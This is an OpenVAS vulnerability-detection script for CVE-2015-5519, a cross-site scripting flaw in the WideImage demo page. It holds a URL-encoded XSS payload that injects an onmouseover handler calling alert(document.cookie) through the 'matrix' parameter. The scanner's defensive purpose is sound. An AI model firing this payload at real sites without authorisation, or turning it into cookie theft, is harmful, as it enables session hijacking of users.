###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wideimage_demo_code_xss_vuln.nasl 11872 2018-10-12 11:22:41Z cfischer $
#
# WideImage Demo Code Cross Site Scripting Vulnerability
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2015 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wideimage:wideimage";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805683");
  script_version("$Revision: 11872 $");
  script_cve_id("CVE-2015-5519");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 13:22:41 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2015-08-03 12:38:23 +0530 (Mon, 03 Aug 2015)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WideImage Demo Code Cross Site Scripting Vulnerability");

  script_tag(name:"summary", value:"This host is installed with WideImage
  and is prone to cross site scripting vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not.");

  script_tag(name:"insight", value:"Flaw exists as the application does not
  validate input passed via 'matrix parameter' to demo/index.php script before
  returning it to user.");

  script_tag(name:"impact", value:"Successful exploitation will allow a
  context-dependent attacker to create a specially crafted request that would
  execute arbitrary script code in a user's browser session within the trust
  relationship between their browser and the server.");

  script_tag(name:"affected", value:"WideImage version 11.02.19");

  script_tag(name:"solution", value:"Remove the 'test' and 'demo' directories
  after installation.");

  script_tag(name:"solution_type", value:"Workaround");

  script_xref(name:"URL", value:"http://www.scip.ch/en/?vuldb.76509");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2015/Jul/30");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/132584");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_wideimage_detect.nasl");
  script_mandatory_keys("WideImage/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wideimage.sourceforge.net/");
  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

url = dir + "/demo/?colors=255&demo=applyConvolution&dither=1&dither_cb=1&div=1&"+
            "match_palette=1&match_palette_cb=1&matrix=2%25200%25200%252c%2"+
            "5200%2520-1%25200%252c%25200%25200%2520-1%22%20onmouseover%3d"+
            "alert%28document.cookie%29%20bad%3d%22&offset=220&output=preset"+
            "%20for%20demo";

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"alert\(document.cookie\)", extra_check:">WideImage"))
{
  report = report_vuln_url( port:http_port, url:url );
  security_message(port:http_port, data:report);
  exit(0);
}
